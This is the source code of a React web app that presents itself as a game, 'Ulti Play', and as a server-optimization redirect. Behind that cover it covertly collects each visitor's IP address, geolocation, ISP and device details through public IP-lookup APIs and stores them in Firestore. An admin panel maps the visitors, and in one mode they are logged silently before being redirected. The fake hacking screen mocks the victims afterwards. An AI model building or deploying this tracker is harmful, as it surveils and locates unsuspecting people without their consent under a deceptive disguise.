import React, { useState, useEffect, useRef, Component } from "react";
import { 
  collection, 
  addDoc, 
  getDocs, 
  query, 
  orderBy, 
  onSnapshot,
  Timestamp,
  getDocFromServer,
  doc,
  setDoc,
  updateDoc
} from "firebase/firestore";
import { 
  signInWithPopup, 
  GoogleAuthProvider, 
  onAuthStateChanged, 
  User 
} from "firebase/auth";
import { db, auth } from "./firebase";
import { motion, AnimatePresence } from "motion/react";
import { Terminal, Shield, Ghost, Lock, User as UserIcon, LogOut, Database, AlertTriangle, Gamepad2, Star, Trophy, Zap, Egg, ChevronDown, ChevronUp, MapPin, Cpu, Globe, Calendar, Info, ToggleLeft, ToggleRight, ExternalLink, Power, RefreshCcw } from "lucide-react";
import { cn } from "./lib/utils";

// --- Types & Constants ---
const ADMIN_EMAIL = "myselfab.official@gmail.com";

const RedirectScreen = ({ url, onLog }: { url: string, onLog: () => void }) => {
  useEffect(() => {
    onLog();
    const timer = setTimeout(() => {
      if (url) window.location.href = url;
    }, 3000);
    return () => clearTimeout(timer);
  }, [url, onLog]);

  return (
    <div className="min-h-screen bg-black text-indigo-500 flex flex-col items-center justify-center p-8 font-mono overflow-hidden">
      <div className="relative mb-12">
        <motion.div 
          animate={{ rotate: 360 }}
          transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
          className="w-24 h-24 border-4 border-indigo-500/20 border-t-indigo-500 rounded-full"
        />
        <Gamepad2 className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-indigo-500" size={32} />
      </div>
      
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center space-y-4"
      >
        <h1 className="text-2xl font-bold tracking-widest text-white">SYSTEM OPTIMIZATION</h1>
        <div className="flex items-center justify-center gap-3 text-indigo-400">
          <RefreshCcw className="animate-spin" size={18} />
          <p className="text-sm uppercase tracking-widest">Redirecting to the fastest server available</p>
        </div>
        
        <div className="mt-8 w-64 h-1 bg-zinc-900 rounded-full overflow-hidden mx-auto">
          <motion.div 
            initial={{ width: 0 }}
            animate={{ width: "100%" }}
            transition={{ duration: 3, ease: "easeInOut" }}
            className="h-full bg-indigo-500"
          />
        </div>
      </motion.div>
    </div>
  );
};

enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId: string | undefined;
    email: string | null | undefined;
    emailVerified: boolean | undefined;
    isAnonymous: boolean | undefined;
    tenantId: string | null | undefined;
    providerInfo: any[];
  }
}

// --- Error Handling ---
function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo: auth.currentUser?.providerData.map(provider => ({
        providerId: provider.providerId,
        displayName: provider.displayName,
        email: provider.email,
        photoUrl: provider.photoURL
      })) || []
    },
    operationType,
    path
  }
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

interface ErrorBoundaryProps {
  children: React.ReactNode;
}

interface ErrorBoundaryState {
  hasError: boolean;
  error: any;
}

class ErrorBoundary extends (Component as any) {
  constructor(props: any) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error: any) {
    return { hasError: true, error };
  }

  render() {
    if ((this as any).state.hasError) {
      return (
        <div className="min-h-screen bg-black text-red-500 flex flex-col items-center justify-center p-8 font-mono">
          <AlertTriangle size={64} className="mb-4 animate-pulse" />
          <h1 className="text-2xl font-bold mb-2">CRITICAL SYSTEM ERROR</h1>
          <p className="text-sm opacity-70 mb-4 max-w-md text-center">
            The application has encountered an unrecoverable error.
          </p>
          <pre className="bg-red-950/30 p-4 rounded border border-red-500/30 text-xs overflow-auto max-w-full">
            {(this as any).state.error?.message || "Unknown error"}
          </pre>
          <button 
            onClick={() => window.location.reload()}
            className="mt-6 px-4 py-2 border border-red-500 hover:bg-red-500 hover:text-black transition-colors"
          >
            REBOOT SYSTEM
          </button>
        </div>
      );
    }
    return (this as any).props.children;
  }
}

// --- Components ---

const HackerEffect = ({ onComplete }: { onComplete: () => void }) => {
  const [lines, setLines] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const terminalRef = useRef<HTMLDivElement>(null);

  const hackerLines = [
    "> INITIALIZING BYPASS...",
    "> TARGET ACQUIRED: REMOTE_HOST",
    "> EXPLOITING CVE-2024-8831...",
    "> BUFFER OVERFLOW SUCCESSFUL",
    "> ESCALATING PRIVILEGES...",
    "> ROOT ACCESS GRANTED",
    "> DUMPING SYSTEM_LOGS...",
    "> EXTRACTING IP_ADDRESS...",
    "> ENCRYPTING LOCAL_DRIVE...",
    "> SENDING DATA TO C2 SERVER...",
    "> CLEANING UP TRACKS...",
    "> CONNECTION TERMINATED."
  ];

  useEffect(() => {
    let currentLine = 0;
    const lineInterval = setInterval(() => {
      if (currentLine < hackerLines.length) {
        setLines(prev => [...prev, hackerLines[currentLine]]);
        currentLine++;
        if (terminalRef.current) {
          terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
      } else {
        clearInterval(lineInterval);
      }
    }, 150);

    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          setTimeout(onComplete, 500);
          return 100;
        }
        // Faster random increment
        const inc = Math.random() > 0.7 ? 8 : 2;
        return Math.min(prev + inc, 100);
      });
    }, 60);

    return () => {
      clearInterval(lineInterval);
      clearInterval(progressInterval);
    };
  }, []);

  return (
    <div className="fixed inset-0 bg-black z-50 flex flex-col p-6 font-mono text-green-500 overflow-hidden">
      {/* Scanline effect */}
      <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.1)_50%),linear-gradient(90deg,rgba(255,0,0,0.03),rgba(0,255,0,0.01),rgba(0,0,255,0.03))] bg-[size:100%_2px,3px_100%] z-10" />
      
      <div className="flex items-center justify-between mb-4 border-b border-green-900 pb-2 relative z-20">
        <div className="flex items-center gap-2">
          <Terminal size={20} className="animate-pulse" />
          <span className="text-sm font-bold tracking-widest">SYSTEM_BREACH_V2.0</span>
        </div>
        <div className="text-xs opacity-50">STATUS: {progress < 100 ? "UPLOADING..." : "COMPLETE"}</div>
      </div>

      <div ref={terminalRef} className="flex-1 overflow-y-auto space-y-1 text-sm md:text-base relative z-20">
        {lines.map((line, i) => (
          <motion.div 
            key={i}
            initial={{ opacity: 0, x: -10 }}
            animate={{ opacity: 1, x: 0 }}
            className={typeof line === 'string' && line.includes("GRANTED") ? "text-red-500 font-bold" : ""}
          >
            {line}
          </motion.div>
        ))}
        <div className="animate-pulse inline-block w-2 h-4 bg-green-500 ml-1" />
      </div>

      {/* Cool Progress Bar Container */}
      <div className="mt-8 relative z-20">
        <div className="flex justify-between items-end mb-2">
          <span className="text-[10px] uppercase tracking-widest opacity-70">Data Extraction Progress</span>
          <span className="text-2xl font-black italic tracking-tighter">{progress}%</span>
        </div>
        <div className="h-6 bg-green-900/20 rounded-sm border border-green-900/50 p-1 overflow-hidden">
          <motion.div 
            className="h-full bg-green-500 shadow-[0_0_20px_rgba(34,197,94,0.6)] relative"
            initial={{ width: 0 }}
            animate={{ width: `${progress}%` }}
            transition={{ type: "spring", stiffness: 50, damping: 20 }}
          >
            {/* Glossy overlay on the bar */}
            <div className="absolute inset-0 bg-gradient-to-b from-white/20 to-transparent" />
          </motion.div>
        </div>
        <div className="flex justify-between mt-1 text-[8px] opacity-40 font-bold">
          <span>0x00000000</span>
          <span>0xFFFFFFFF</span>
        </div>
      </div>

      {/* Background visual noise */}
      <div className="absolute bottom-20 right-6 opacity-10 text-[8px] pointer-events-none select-none">
        {Array.from({ length: 5 }).map((_, i) => (
          <div key={i}>{Math.random().toString(36).substring(2, 15)}</div>
        ))}
      </div>
    </div>
  );
};

const AdminPanel = ({ user, onLogout }: { user: User, onLogout: () => void }) => {
  const [logs, setLogs] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [config, setConfig] = useState<{ prankModeEnabled: boolean, redirectUrl: string }>({ prankModeEnabled: true, redirectUrl: "" });
  const [updatingConfig, setUpdatingConfig] = useState(false);
  const [newUrl, setNewUrl] = useState("");

  useEffect(() => {
    if (user?.email !== ADMIN_EMAIL) return;

    const q = query(collection(db, "logs"), orderBy("timestamp", "desc"));
    console.log("AdminPanel: Attaching onSnapshot to 'logs' collection...");
    const unsubscribeLogs = onSnapshot(q, (snapshot) => {
      console.log(`AdminPanel: Received snapshot with ${snapshot.size} documents.`);
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setLogs(data);
      setLoading(false);
    }, (error) => {
      console.error("AdminPanel: onSnapshot error:", error);
      handleFirestoreError(error, OperationType.LIST, "logs");
    });

    const configRef = doc(db, "config", "global");
    const unsubscribeConfig = onSnapshot(configRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data() as any;
        setConfig(data);
        setNewUrl(data.redirectUrl);
      } else {
        setDoc(configRef, { prankModeEnabled: true, redirectUrl: "https://google.com" });
      }
    }, (error) => {
      console.warn("AdminPanel: Config listener failed (likely rules not deployed):", error);
    });

    return () => {
      unsubscribeLogs();
      unsubscribeConfig();
    };
  }, []);

  const togglePrankMode = async () => {
    setUpdatingConfig(true);
    try {
      await updateDoc(doc(db, "config", "global"), {
        prankModeEnabled: !config.prankModeEnabled
      });
    } catch (error) {
      console.error("Error updating config:", error);
    } finally {
      setUpdatingConfig(false);
    }
  };

  const updateRedirectUrl = async () => {
    if (!newUrl) return;
    setUpdatingConfig(true);
    try {
      await updateDoc(doc(db, "config", "global"), {
        redirectUrl: newUrl
      });
    } catch (error) {
      console.error("Error updating redirect URL:", error);
    } finally {
      setUpdatingConfig(false);
    }
  };

  if (user.email !== ADMIN_EMAIL) {
    return (
      <div className="min-h-screen bg-zinc-950 text-zinc-400 flex flex-col items-center justify-center p-8 font-mono">
        <Lock size={48} className="mb-4 text-red-500" />
        <h1 className="text-xl font-bold text-white mb-2">ACCESS DENIED</h1>
        <p className="text-sm mb-6">Unauthorized personnel detected.</p>
        <button 
          onClick={onLogout}
          className="px-4 py-2 bg-zinc-900 border border-zinc-800 hover:border-zinc-700 text-zinc-300 rounded transition-colors"
        >
          Return to Base
        </button>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-300 font-mono p-4 md:p-8">
      <div className="max-w-5xl mx-auto">
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8 border-b border-zinc-800 pb-6">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-indigo-600 rounded-lg flex items-center justify-center text-white">
              <Database size={24} />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white leading-tight">Admin Intelligence</h1>
              <p className="text-xs text-zinc-500">Monitoring logged entities</p>
            </div>
          </div>
          
          <div className="flex flex-wrap items-center gap-4 bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
            <div className="flex items-center gap-3 pr-4 border-r border-zinc-800">
              <div className="flex flex-col">
                <span className="text-[10px] text-zinc-500 uppercase font-bold">Prank Mode</span>
                <span className={cn("text-xs font-bold", config.prankModeEnabled ? "text-green-500" : "text-red-500")}>
                  {config.prankModeEnabled ? "ACTIVE" : "DISABLED"}
                </span>
              </div>
              <button 
                onClick={togglePrankMode}
                disabled={updatingConfig}
                className={cn(
                  "p-2 rounded-lg transition-all",
                  config.prankModeEnabled ? "bg-green-500/10 text-green-500 hover:bg-green-500/20" : "bg-red-500/10 text-red-500 hover:bg-red-500/20"
                )}
              >
                {config.prankModeEnabled ? <ToggleRight size={24} /> : <ToggleLeft size={24} />}
              </button>
            </div>

            <div className="flex items-center gap-3">
              <div className="flex flex-col">
                <span className="text-[10px] text-zinc-500 uppercase font-bold">Redirect URL</span>
                <div className="flex items-center gap-2 mt-1">
                  <input 
                    type="text" 
                    value={newUrl}
                    onChange={(e) => setNewUrl(e.target.value)}
                    placeholder="https://..."
                    className="bg-zinc-950 border border-zinc-800 rounded px-2 py-1 text-xs w-48 focus:outline-none focus:border-indigo-500 transition-colors"
                  />
                  <button 
                    onClick={updateRedirectUrl}
                    disabled={updatingConfig || newUrl === config.redirectUrl}
                    className="p-1.5 bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 disabled:hover:bg-indigo-600 rounded text-white transition-colors"
                  >
                    <ExternalLink size={14} />
                  </button>
                </div>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-4">
            <div className="text-right hidden sm:block">
              <div className="text-xs font-bold text-zinc-400">{user.displayName}</div>
              <div className="text-[10px] text-zinc-600">{user.email}</div>
            </div>
            <button 
              onClick={onLogout}
              className="p-2 hover:bg-zinc-900 rounded-full text-zinc-500 hover:text-red-400 transition-colors"
              title="Logout"
            >
              <LogOut size={20} />
            </button>
          </div>
        </header>

        {loading ? (
          <div className="flex items-center justify-center h-64">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-indigo-500"></div>
          </div>
        ) : (
          <div className="grid gap-4">
            {logs.length === 0 ? (
              <div className="text-center py-20 border border-dashed border-zinc-800 rounded-xl">
                <Ghost className="mx-auto mb-4 text-zinc-700" size={48} />
                <p className="text-zinc-500">No logs captured yet.</p>
              </div>
            ) : (
              <div className="overflow-x-auto rounded-xl border border-zinc-800 bg-zinc-900/50">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="bg-zinc-900 text-zinc-500 text-[10px] uppercase tracking-wider">
                      <th className="px-6 py-4 font-semibold">User Name</th>
                      <th className="px-6 py-4 font-semibold">IP Address</th>
                      <th className="px-6 py-4 font-semibold text-right">Action</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-zinc-800">
                    {logs.map((log) => (
                      <React.Fragment key={log.id}>
                        <tr className={cn(
                          "hover:bg-zinc-800/30 transition-colors group cursor-pointer",
                          expandedId === log.id && "bg-zinc-800/50"
                        )} onClick={() => setExpandedId(expandedId === log.id ? null : log.id)}>
                          <td className="px-6 py-4">
                            <div className="flex items-center gap-3">
                              <div className="w-8 h-8 rounded bg-zinc-800 flex items-center justify-center text-zinc-500 group-hover:bg-indigo-900/30 group-hover:text-indigo-400 transition-colors">
                                <UserIcon size={14} />
                              </div>
                              <span className="text-sm font-medium text-zinc-200">{log.name}</span>
                            </div>
                          </td>
                          <td className="px-6 py-4">
                            <code className="text-xs bg-zinc-950 px-2 py-1 rounded border border-zinc-800 text-indigo-400 w-fit">
                              {log.ip}
                            </code>
                          </td>
                          <td className="px-6 py-4 text-right">
                            <button className="p-2 hover:bg-zinc-800 rounded-lg text-zinc-500 transition-colors">
                              {expandedId === log.id ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
                            </button>
                          </td>
                        </tr>
                        {expandedId === log.id && (
                          <tr className="bg-zinc-900/30">
                            <td colSpan={3} className="px-6 py-6">
                              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                                <div className="space-y-4">
                                  <div className="flex items-start gap-3">
                                    <MapPin size={16} className="text-indigo-500 mt-1" />
                                    <div>
                                      <div className="text-[10px] text-zinc-500 uppercase font-bold mb-1">Location</div>
                                      <div className="text-sm text-zinc-300">{log.city || "Unknown"}, {log.region || "Unknown"}</div>
                                      <div className="text-xs text-zinc-500">{log.country || "Unknown"} {log.postal ? `(${log.postal})` : ""}</div>
                                      {log.latitude && log.longitude && (
                                        <div className="text-[10px] text-zinc-600 mt-1">{log.latitude}, {log.longitude}</div>
                                      )}
                                    </div>
                                  </div>
                                  <div className="flex items-start gap-3">
                                    <Globe size={16} className="text-indigo-500 mt-1" />
                                    <div>
                                      <div className="text-[10px] text-zinc-500 uppercase font-bold mb-1">ISP / Organization</div>
                                      <div className="text-sm text-zinc-300">{log.org || "Unknown"}</div>
                                    </div>
                                  </div>
                                </div>

                                <div className="space-y-4">
                                  <div className="flex items-start gap-3">
                                    <Cpu size={16} className="text-indigo-500 mt-1" />
                                    <div>
                                      <div className="text-[10px] text-zinc-500 uppercase font-bold mb-1">Device Information</div>
                                      <div className="text-xs font-mono text-zinc-400 bg-zinc-950 p-2 rounded border border-zinc-800 mt-1">
                                        {log.deviceInfo || "Unknown Device"}
                                      </div>
                                    </div>
                                  </div>
                                  <div className="flex items-start gap-3">
                                    <Calendar size={16} className="text-indigo-500 mt-1" />
                                    <div>
                                      <div className="text-[10px] text-zinc-500 uppercase font-bold mb-1">Timestamp</div>
                                      <div className="text-sm text-zinc-300">
                                        {log.timestamp?.toDate ? log.timestamp.toDate().toLocaleString() : new Date(log.timestamp).toLocaleString()}
                                      </div>
                                    </div>
                                  </div>
                                </div>

                                <div className="space-y-4">
                                  <div className="flex items-start gap-3">
                                    <Info size={16} className="text-indigo-500 mt-1" />
                                    <div>
                                      <div className="text-[10px] text-zinc-500 uppercase font-bold mb-1">External Tools</div>
                                      {log.latitude && log.longitude ? (
                                        <a 
                                          href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`} 
                                          target="_blank" 
                                          rel="noopener noreferrer"
                                          className="inline-flex items-center gap-2 text-xs bg-indigo-600 hover:bg-indigo-500 text-white px-3 py-1.5 rounded transition-colors mt-2"
                                        >
                                          <MapPin size={12} />
                                          Open in Google Maps
                                        </a>
                                      ) : (
                                        <div className="text-xs text-zinc-600 mt-2 italic">Map data unavailable</div>
                                      )}
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </td>
                          </tr>
                        )}
                      </React.Fragment>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

const Minigame = ({ onWin }: { onWin: (name: string) => void }) => {
  const [name, setName] = useState("");
  const [score, setScore] = useState(0);
  const [btnPos, setBtnPos] = useState({ top: "50%", left: "50%" });
  const [gameStarted, setGameStarted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const moveButton = () => {
    const top = Math.random() * 80 + 10 + "%";
    const left = Math.random() * 80 + 10 + "%";
    setBtnPos({ top, left });
    setScore(s => s + 1);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!name.trim()) return;
    setIsSubmitting(true);
    setTimeout(() => onWin(name), 500);
  };

  return (
    <div className="min-h-screen bg-[#1a0b2e] flex flex-col items-center justify-center p-6 relative overflow-hidden">
      {/* Background elements - Gamey style */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        <div className="absolute top-[10%] left-[5%] text-purple-500/20 rotate-12"><Gamepad2 size={120} /></div>
        <div className="absolute bottom-[15%] right-[10%] text-pink-500/20 -rotate-12"><Trophy size={100} /></div>
        <div className="absolute top-[40%] right-[5%] text-yellow-500/20 animate-bounce"><Star size={60} /></div>
        <div className="absolute bottom-[40%] left-[10%] text-blue-500/20 animate-pulse"><Zap size={80} /></div>
        
        {/* Grid pattern */}
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#80808012_1px,transparent_1px),linear-gradient(to_bottom,#80808012_1px,transparent_1px)] bg-[size:40px_40px]"></div>
      </div>

      <AnimatePresence mode="wait">
        {!gameStarted ? (
          <motion.div 
            key="start"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.8 }}
            className="bg-white rounded-[2.5rem] p-1 border-8 border-[#3d1d6d] shadow-[0_20px_0_#2a144a] max-w-sm w-full relative z-10"
          >
            <div className="bg-[#5d2fb1] rounded-[2rem] p-8 text-center">
              <div className="w-24 h-24 bg-yellow-400 rounded-3xl mx-auto mb-6 flex items-center justify-center text-[#1a0b2e] shadow-[0_8px_0_#b8860b] -rotate-3">
                <Gamepad2 size={56} />
              </div>
              
              <h1 className="text-4xl font-black text-white mb-2 tracking-tighter italic uppercase">
                Ulti <span className="text-yellow-400">Play</span>
              </h1>
              <p className="text-purple-200 text-sm font-bold mb-8 uppercase tracking-widest">Enter your nickname to join!</p>
              
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="relative">
                  <input 
                    type="text" 
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    placeholder="NICKNAME..."
                    className="w-full bg-[#1a0b2e] border-4 border-[#3d1d6d] rounded-2xl px-6 py-4 text-white font-black placeholder:text-white/20 focus:outline-none focus:border-yellow-400 transition-all text-center text-xl uppercase"
                    required
                  />
                </div>
                
                <button 
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-yellow-400 hover:bg-yellow-300 text-[#1a0b2e] font-black py-5 rounded-2xl shadow-[0_8px_0_#b8860b] transition-all active:translate-y-1 active:shadow-[0_4px_0_#b8860b] disabled:opacity-50 text-2xl uppercase italic tracking-tighter"
                >
                  {isSubmitting ? "LOADING..." : "PLAY NOW!"}
                </button>
              </form>
              
              <div className="mt-8 flex justify-center gap-4">
                <div className="flex items-center gap-1 text-purple-300 text-[10px] font-bold">
                  <Star size={12} className="fill-purple-300" /> 1.2M ONLINE
                </div>
                <div className="flex items-center gap-1 text-purple-300 text-[10px] font-bold">
                  <Zap size={12} className="fill-purple-300" /> FAST SERVERS
                </div>
              </div>
            </div>
          </motion.div>
        ) : (
          <motion.div 
            key="game"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="w-full h-full flex flex-col items-center"
          >
            <div className="absolute top-8 left-8 text-white font-bold text-2xl">
              SCORE: {score}
            </div>
            <motion.button
              animate={{ top: btnPos.top, left: btnPos.left }}
              transition={{ type: "spring", stiffness: 300, damping: 20 }}
              onClick={moveButton}
              className="absolute px-6 py-3 bg-white text-indigo-950 font-black rounded-full shadow-xl"
            >
              CLICK ME!
            </motion.button>
          </motion.div>
        )}
      </AnimatePresence>

      <button 
        onClick={() => window.location.href = "/?admin=true"}
        className="absolute bottom-4 right-4 text-white/5 hover:text-white/20 transition-colors text-[10px] font-mono"
      >
        ADMIN_PORTAL
      </button>
    </div>
  );
};

const SuccessScreen = ({ name }: { name: string }) => {
  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center p-8 text-center font-mono">
      <motion.div
        initial={{ scale: 0 }}
        animate={{ scale: 1 }}
        transition={{ type: "spring", damping: 12 }}
        className="w-24 h-24 bg-zinc-900 rounded-full flex items-center justify-center text-5xl mb-8 shadow-[0_0_30px_rgba(255,255,255,0.05)] border border-zinc-800"
      >
        🥔
      </motion.div>
      <motion.h1 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.2 }}
        className="text-4xl font-black text-white mb-4"
      >
        Thanks for your IP mate &lt;3
      </motion.h1>
      <motion.p 
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.4 }}
        className="text-green-500 text-lg"
      >
        User <span className="underline">{name}</span> has been successfully indexed.
      </motion.p>
      <motion.div 
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 1 }}
        className="mt-12 text-zinc-700 text-xs"
      >
        SYSTEM_IDLE // DATA_UPLOAD_COMPLETE
      </motion.div>
    </div>
  );
};

export default function App() {
  const [view, setView] = useState<"game" | "hacking" | "success" | "admin">("game");
  const [userName, setUserName] = useState("");
  const [config, setConfig] = useState<{ prankModeEnabled: boolean, redirectUrl: string }>({ prankModeEnabled: true, redirectUrl: "" });
  const hasLoggedRef = useRef(false);

  const logUserActivity = async (name: string) => {
    if (hasLoggedRef.current) return;
    hasLoggedRef.current = true;

    try {
      // Get IP and details from public APIs with multiple fallbacks
      let ip = "unknown";
      let details: any = {};
      
      // Get Device Info
      const getDeviceInfo = () => {
        const ua = navigator.userAgent;
        let device = "Desktop";
        let browser = "Unknown Browser";
        let os = "Unknown OS";

        if (ua.indexOf("Win") !== -1) os = "Windows";
        if (ua.indexOf("Mac") !== -1) os = "MacOS";
        if (ua.indexOf("Linux") !== -1) os = "Linux";
        if (ua.indexOf("Android") !== -1) os = "Android";
        if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";

        if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
        else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
        else if (ua.indexOf("Safari") !== -1) browser = "Safari";
        else if (ua.indexOf("Edge") !== -1) browser = "Edge";

        if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) device = "Mobile";
        
        return `${device} | ${os} | ${browser}`;
      };

      const deviceInfo = getDeviceInfo();

      const fetchIPDetails = async () => {
        // Try ipwho.is first
        try {
          const res = await fetch("https://ipwho.is/");
          const data = await res.json();
          if (data.success) {
            return {
              ip: data.ip,
              city: data.city,
              region: data.region,
              country: data.country,
              org: data.connection?.isp || data.connection?.org,
              latitude: data.latitude,
              longitude: data.longitude,
              postal: data.postal
            };
          }
        } catch (e) { console.warn("ipwho.is failed", e); }

        // Try ipapi.co as second option
        try {
          const res = await fetch("https://ipapi.co/json/");
          const data = await res.json();
          if (!data.error) {
            return {
              ip: data.ip,
              city: data.city,
              region: data.region,
              country: data.country_name,
              org: data.org || data.asn,
              latitude: data.latitude,
              longitude: data.longitude,
              postal: data.postal
            };
          }
        } catch (e) { console.warn("ipapi.co failed", e); }

        // Try freeipapi.com as third option
        try {
          const res = await fetch("https://freeipapi.com/api/json");
          const data = await res.json();
          return {
            ip: data.ipAddress,
            city: data.cityName,
            region: data.regionName,
            country: data.countryName,
            org: data.asName,
            latitude: data.latitude,
            longitude: data.longitude,
            postal: data.zipCode
          };
        } catch (e) { console.warn("freeipapi.com failed", e); }

        return null;
      };

      const data = await fetchIPDetails();
      if (data) {
        ip = data.ip || "unknown";
        details = {
          city: data.city || "unknown",
          region: data.region || "unknown",
          country: data.country || "unknown",
          org: data.org || "unknown",
          latitude: data.latitude || 0,
          longitude: data.longitude || 0,
          postal: data.postal || "unknown"
        };
      } else {
        // Last resort: just get the IP
        try {
          const res = await fetch("https://api.ipify.org?format=json");
          const data = await res.json();
          ip = data.ip || "unknown";
        } catch (e) { console.warn("Final fallback failed", e); }
      }

      // Log to Firestore
      console.log("logUserActivity: Attempting to log to Firestore...", { name, ip, deviceInfo, ...details });
      await addDoc(collection(db, "logs"), {
        name: name || "Anonymous",
        ip: String(ip),
        deviceInfo: deviceInfo,
        ...details,
        timestamp: Timestamp.now()
      });
      console.log("logUserActivity: Successfully logged to Firestore.");
    } catch (error) {
      console.error("Logging failed:", error);
      handleFirestoreError(error, OperationType.WRITE, "logs");
    }
  };

  useEffect(() => {
    const configRef = doc(db, "config", "global");
    const unsubscribe = onSnapshot(configRef, (docSnap) => {
      if (docSnap.exists()) {
        setConfig(docSnap.data() as any);
      }
    }, (error) => {
      console.warn("App: Global config listener failed:", error);
    });
    return () => unsubscribe();
  }, []);
  const [user, setUser] = useState<User | null>(null);
  const [isAuthReady, setIsAuthReady] = useState(false);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (u) => {
      setUser(u);
      setIsAuthReady(true);
    });

    // Test connection to Firestore
    const testConnection = async () => {
      try {
        await getDocFromServer(doc(db, 'test', 'connection'));
        console.log("Firestore connection test successful.");
      } catch (error) {
        if(error instanceof Error && error.message.includes('the client is offline')) {
          console.error("Please check your Firebase configuration. The client is offline.");
        }
      }
    };
    testConnection();

    return () => unsubscribe();
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get("admin") === "true") {
      setView("admin");
    }
  }, []);

  const handleWin = async (name: string) => {
    setUserName(name);
    setView("hacking");
    await logUserActivity(name);
  };

  const handleAdminLogin = async () => {
    const provider = new GoogleAuthProvider();
    try {
      await signInWithPopup(auth, provider);
    } catch (error) {
      console.error("Login failed:", error);
    }
  };

  if (!isAuthReady) return null;

  // Global Redirect Logic
  if (!config.prankModeEnabled && view !== "admin" && user?.email !== ADMIN_EMAIL) {
    return <RedirectScreen url={config.redirectUrl} onLog={() => logUserActivity("Redirected Visitor")} />;
  }

  return (
    <ErrorBoundary>
      <div className="min-h-screen bg-black">
        {view === "admin" ? (
          user ? (
            <AdminPanel user={user} onLogout={() => auth.signOut()} />
          ) : (
            <div className="min-h-screen flex flex-col items-center justify-center p-8 bg-zinc-950 font-mono">
              <Lock size={48} className="mb-6 text-indigo-500" />
              <h1 className="text-2xl font-bold text-white mb-8">ADMIN AUTHENTICATION</h1>
              <button 
                onClick={handleAdminLogin}
                className="flex items-center gap-3 px-6 py-3 bg-white text-black font-bold rounded-xl hover:bg-zinc-200 transition-colors"
              >
                <img src="https://www.google.com/favicon.ico" alt="Google" className="w-5 h-5" />
                Sign in with Google
              </button>
              <button 
                onClick={() => setView("game")}
                className="mt-8 text-zinc-600 hover:text-zinc-400 text-xs underline"
              >
                Return to Public Interface
              </button>
            </div>
          )
        ) : view === "game" ? (
          <Minigame onWin={handleWin} />
        ) : view === "hacking" ? (
          <HackerEffect onComplete={() => setView("success")} />
        ) : (
          <SuccessScreen name={userName} />
        )}
      </div>
    </ErrorBoundary>
  );
}
